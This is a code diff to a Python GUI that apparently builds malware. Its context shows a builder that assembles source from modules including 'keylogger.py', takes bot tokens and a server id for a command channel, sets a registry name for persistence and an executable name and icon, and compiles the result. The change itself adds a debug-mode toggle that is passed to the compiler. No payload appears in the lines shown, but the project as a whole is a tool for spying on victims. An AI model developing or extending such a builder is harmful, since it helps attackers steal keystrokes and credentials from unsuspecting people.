@@ -12,6 +12,7 @@ window_icon = 'resources/icons/icon.ico'; Image.open('resources/icons/icon.ico')
 config_path, status = 'configuration.ini', 'configuration'
 config = configparser.ConfigParser()
 config['SETTINGS'], config['FUNCTIONALITY'] = {}, {}
+debug_mode = False
 
 filenames = {
     'keylogr': 'keylogger.py',
@@ -175,6 +176,17 @@ def disclaimer_toggle():
         config_modification()
         generate_source_btn['state'] = DISABLED
 
+def debug_toggle():
+    global debug_mode
+    if not debug_mode:
+        debug_mode_btn['text'] = 'Debug mode [ON]'
+        debug_mode_btn['fg'] = 'white'
+        debug_mode = True
+    else:
+        debug_mode_btn['text'] = 'Debug mode [OFF]'
+        debug_mode_btn['fg'] = 'gray'
+        debug_mode = False
+
 def assemble_source_code():
     global source_code_modifiers, status, config_path
     
@@ -207,7 +219,6 @@ def assemble_source_code():
                 if len(line.lstrip()) > 0:
                     if line.lstrip()[:6] == '#.log ':
                         log_source.write(' '*(len(line)-len(line.lstrip()))+f'{line.lstrip()[:-1]}({filenames[file]}:{line_number})*\n')
-                        #log_source.write(' '*(len(line)-len(line.lstrip()))+f'{line.lstrip()[:-1].replace(f"({filenames[file]}:{line_number-1})", "")}\n')
                     else:
                         log_source.write(line)
     
@@ -270,7 +281,7 @@ def change_icon(path=False):
     config_modification()
 
 def compile_source():
-    global status
+    global status, debug_mode
     custom_imports = configparser.ConfigParser()
     custom_imports.read('resources/custom_imports.ini')
     with open('custom_imports.txt', 'w') as imports_file:
@@ -283,7 +294,7 @@ def compile_source():
         for general_packages in custom_imports['general'].keys():
             imports_file.write(custom_imports['general'][general_packages] + '\n')
 
-    response = compiler.compile()
+    response = compiler.compile(debug_mode)
     compile_btn['state'] = DISABLED
     status = 'compiled'
 
@@ -329,6 +340,9 @@ else:
     icon_btn = Button(settings_canvas, image=icon_photo, state=NORMAL, width=120, height=120, command=change_icon)
     icon_btn.grid(row=10, column=1, pady=2, sticky=NW, rowspan=6)
 
+    debug_mode_btn = Button(settings_canvas, text='Debug mode [OFF]', fg='gray', state=NORMAL, width=12, height=1, command=debug_toggle)
+    debug_mode_btn.grid(row=15, column=1, padx=(5, 5), pady=10, sticky=NSEW, rowspan=2)
+
     var_server_id = StringVar()
     var_bot_token_1 = StringVar()
     var_bot_token_2 = StringVar()
@@ -343,6 +357,7 @@ else:
     registry_name = Entry(settings_canvas, textvariable=var_registry_name)
     directory_name = Entry(settings_canvas, textvariable=var_directory_name)
     executable_name = Entry(settings_canvas, textvariable=var_executable_name)
+    
 
     var_server_id.trace_add("write", config_modification)
     var_bot_token_1.trace_add("write", config_modification)
